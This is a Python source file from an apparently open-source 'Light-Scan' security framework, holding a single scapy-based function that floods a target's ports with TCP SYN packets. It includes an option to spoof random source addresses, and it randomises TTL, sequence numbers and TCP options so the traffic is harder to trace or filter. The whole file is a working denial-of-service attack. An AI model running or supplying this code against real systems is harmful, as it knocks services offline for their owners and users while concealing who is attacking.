# Light-Scan Framework - Network Security Scanning Framework
# Copyright (C) 2026 Adam Boulaaz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

from scapy.layers.inet import IP, TCP
from scapy.all import send
from LightMirage import mirage

def syn_flood_attack(target,ports,count,hidesrc=False):
    for port in ports:
        for i in range(count):
            if hidesrc:
                packet = IP(dst=target, ttl=mirage.ipv4_ttl(), id=mirage.ipv4_id(), src=mirage.ipv4_random(), flags=mirage.ipv4_flags()) / TCP(
                    dport=port, flags="S",options=mirage.Stealth_tcp_options(),window=mirage.tcp_window(),seq=mirage.tcp_seq(),sport=mirage.tcp_sport())
            else:
                packet = IP(dst=target, ttl=mirage.ipv4_ttl(), id=mirage.ipv4_id(),flags=mirage.ipv4_flags()) / TCP(
                    dport=port, flags="S", options=mirage.Stealth_tcp_options(), window=mirage.tcp_window(),seq=mirage.tcp_seq(), sport=mirage.tcp_sport())
            send(packet,verbose=False)



